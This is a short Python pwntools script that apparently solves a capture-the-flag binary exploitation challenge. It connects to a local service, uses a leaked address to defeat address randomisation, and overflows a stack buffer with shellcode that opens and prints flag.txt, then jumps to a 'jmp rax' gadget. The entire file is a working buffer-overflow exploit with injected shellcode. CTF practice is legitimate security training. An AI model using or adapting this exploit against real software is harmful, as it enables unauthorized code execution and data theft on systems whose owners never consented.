#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["setup"]

JMP_RAX = elf.address + 0x116f

payload = b""
payload += asm(shellcraft.open("flag.txt"))
payload += asm(shellcraft.read('rax', 'rsp', 64))
payload += asm(shellcraft.write(1, 'rsp', 'rax'))
payload = payload.ljust(0x108, b"A")
payload += p64(JMP_RAX)
p.sendline(payload)

p.interactive()
